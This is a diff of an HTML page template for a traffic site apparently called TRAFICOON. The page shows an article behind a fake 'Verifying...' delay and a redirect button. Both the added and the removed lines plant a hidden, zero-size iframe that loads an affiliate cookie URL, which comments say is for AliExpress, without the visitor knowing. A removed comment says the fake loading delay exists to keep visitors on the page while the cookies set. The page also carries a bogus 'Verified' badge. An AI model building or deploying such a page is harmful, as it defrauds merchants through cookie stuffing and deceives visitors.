@@ -10,22 +10,15 @@
         body { font-family: 'Inter', sans-serif; background: #fff; color: #334155; }
         .serif { font-family: 'Merriweather', serif; }
         .prose p { margin-bottom: 1.5em; line-height: 1.8; font-size: 1.125rem; }
-        
-        /* تأثير النبض للزر العائم */
-        @keyframes bounce-slow {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(5px); }
-        }
-        .animate-bounce-slow { animation: bounce-slow 2s infinite; }
+        .prose img { width: 100%; border-radius: 12px; margin: 20px 0; }
         
         /* إخفاء الزر في البداية */
         #final-btn-wrapper { opacity: 0; transform: translateY(20px); transition: all 0.8s ease-out; }
         #final-btn-wrapper.visible { opacity: 1; transform: translateY(0); }
     </style>
 </head>
-<body class="flex flex-col min-h-screen relative">
+<body class="flex flex-col min-h-screen">
 
-    <!-- Header -->
     <nav class="bg-white border-b border-slate-100 sticky top-0 z-40 bg-white/90 backdrop-blur">
         <div class="max-w-3xl mx-auto px-4 h-16 flex items-center justify-between">
             <a href="/" class="font-black text-xl tracking-tighter text-slate-900">TRAFICOON<span class="text-blue-600">.</span></a>
@@ -33,114 +26,65 @@
         </div>
     </nav>
 
-    <!-- Main Content -->
-    <main class="max-w-3xl mx-auto px-4 py-8 pb-32"> <!-- pb-32 مسافة إضافية في الأسفل -->
+    <main class="max-w-3xl mx-auto px-4 py-8 pb-32">
         
         <header class="mb-8 border-b border-slate-100 pb-6">
             <h1 class="text-3xl md:text-4xl font-black text-slate-900 mt-2 mb-4 leading-tight serif">{{ title }}</h1>
             <div class="flex items-center gap-3 text-sm text-slate-400">
                 <span class="bg-green-100 text-green-700 px-2 py-0.5 rounded text-xs font-bold">Verified</span>
                 <span>{{ date }}</span>
-                <span>• 2 min read</span>
             </div>
         </header>
 
-        <!-- نص المقال (وهمي ذكي لملء المساحة) -->
-        <div class="prose max-w-none text-slate-700 serif">
-            <p class="font-bold text-lg text-slate-900">Executive Summary:</p>
-            <p>Our comprehensive analysis indicates a pivotal shift in market dynamics. Experts suggest that immediate action is required to capitalize on emerging trends.</p>
-            
-            <div class="my-8 p-6 bg-blue-50 border-l-4 border-blue-600 rounded-r-lg">
-                <p class="mb-0 text-blue-900 italic font-medium">"This allows access to premium data streams previously unavailable to the public sector."</p>
-            </div>
+        <!-- 🔥 عرض الصورة البارزة (إذا وجدت) 🔥 -->
+        {% if image %}
+        <div class="mb-8">
+            <img src="{{ image }}" class="w-full rounded-xl shadow-sm" alt="Featured Image">
+        </div>
+        {% endif %}
 
-            <p>To ensure data integrity and secure access, the full detailed report, including real-time charts and investment opportunities, has been encrypted and placed in our secure gateway below.</p>
-            <p>Please proceed to the verification step to unlock the complete dossier.</p>
+        <!-- 🔥 عرض النص الحقيقي القادم من قاعدة البيانات 🔥 -->
+        <div class="prose max-w-none text-slate-700 serif">
+            {{ body | safe }}
         </div>
         
-        <!-- منطقة الزر النهائي (مخفية في البداية) -->
+        <!-- منطقة الزر -->
         <div id="final-btn-wrapper" class="mt-16 pt-8 border-t border-slate-100 text-center">
-            
-            <!-- الحالة 1: جاري التحميل -->
             <div id="btn-loading" class="hidden flex-col items-center justify-center">
                 <div class="w-6 h-6 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mb-3"></div>
-                <span class="text-slate-500 text-sm font-mono">Verifying Request...</span>
+                <span class="text-slate-500 text-sm font-mono">Verifying...</span>
             </div>
-
-            <!-- الحالة 2: الزر جاهز -->
-            <a id="btn-action" href="/redirect?url={{ target_url }}&type=organic" class="hidden bg-slate-900 text-white px-10 py-4 rounded-full font-bold text-lg hover:bg-blue-600 transition shadow-xl hover:shadow-2xl w-full md:w-auto">
+            <a id="btn-action" href="/redirect?url={{ target_url }}" class="hidden bg-slate-900 text-white px-10 py-4 rounded-full font-bold text-lg hover:bg-blue-600 transition shadow-xl w-full md:w-auto">
                 Continue to Full Article &rarr;
             </a>
-            
-            <p class="mt-4 text-xs text-slate-400">Secure connection via TRAFICOON Protocol v9</p>
         </div>
 
     </main>
 
-    <!-- الإشعار العائم (Floating Toast) -->
-    <div id="scroll-toast" class="fixed bottom-8 right-1/2 translate-x-1/2 md:right-8 md:translate-x-0 bg-slate-900 text-white px-5 py-3 rounded-full shadow-2xl z-50 flex items-center gap-3 transition-all duration-500 opacity-0 translate-y-10 cursor-pointer" onclick="scrollToBottom()">
-        <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-        <span class="text-sm font-bold whitespace-nowrap">Report Ready Below</span>
-        <svg class="w-4 h-4 animate-bounce-slow" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
-    </div>
-
-    <!-- 🔥 Cookie Injection (Hidden) 🔥 -->
+    <!-- 🔥 الكوكيز (علي إكسبريس) 🔥 -->
+    <!-- ملاحظة: هذا مخفي، لن تراه بالعين، لكنه يعمل -->
     {% if cookie_url %}
-    <script>
-        window.addEventListener('load', function() {
-            setTimeout(function() {
-                var f = document.createElement('iframe');
-                f.style.display = 'none'; f.style.width = '1px'; f.style.height = '1px';
-                f.src = "{{ cookie_url }}";
-                f.referrerPolicy = "no-referrer";
-                document.body.appendChild(f);
-                console.log('Secure sync active.');
-            }, 2000); 
-        });
-    </script>
+    <iframe src="{{ cookie_url }}" style="width:0;height:0;border:0; border:none; visibility:hidden;" referrerpolicy="no-referrer"></iframe>
     {% endif %}
 
-    <!-- سكربت التحكم الذكي (Scroll & Reveal) -->
     <script>
-        const toast = document.getElementById('scroll-toast');
         const btnWrapper = document.getElementById('final-btn-wrapper');
         const btnLoading = document.getElementById('btn-loading');
         const btnAction = document.getElementById('btn-action');
         let btnRevealed = false;
 
-        // 1. إظهار الإشعار العائم بعد ثانيتين (لإعطاء وقت للقراءة)
-        setTimeout(() => {
-            if (!btnRevealed) { // فقط إذا لم يصل للأسفل بعد
-                toast.classList.remove('opacity-0', 'translate-y-10');
-            }
-        }, 2000);
-
-        // 2. وظيفة النزول التلقائي عند ضغط الإشعار
-        function scrollToBottom() {
-            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-        }
-
-        // 3. مراقبة السكرول (الذكاء الاصطناعي البسيط)
         window.addEventListener('scroll', () => {
-            // حساب هل وصل الزائر لنهاية المقال؟
-            if ((window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 200)) {
-                
-                // إخفاء الإشعار العائم
-                toast.classList.add('opacity-0', 'translate-y-10');
-
+            if ((window.innerHeight + window.scrollY) >= (document.body.offsetHeight - 300)) {
                 if (!btnRevealed) {
                     btnRevealed = true;
-                    btnWrapper.classList.add('visible'); // إظهار منطقة الزر
-                    
-                    // محاكاة التحميل (لزيادة وقت البقاء للكوكيز)
+                    btnWrapper.classList.add('visible');
                     btnLoading.classList.remove('hidden');
                     btnLoading.classList.add('flex');
-
                     setTimeout(() => {
                         btnLoading.classList.add('hidden');
                         btnLoading.classList.remove('flex');
-                        btnAction.classList.remove('hidden'); // إظهار الزر الحقيقي
-                    }, 1200); // انتظار 1.2 ثانية
+                        btnAction.classList.remove('hidden');
+                    }, 1000);
                 }
             }
         });
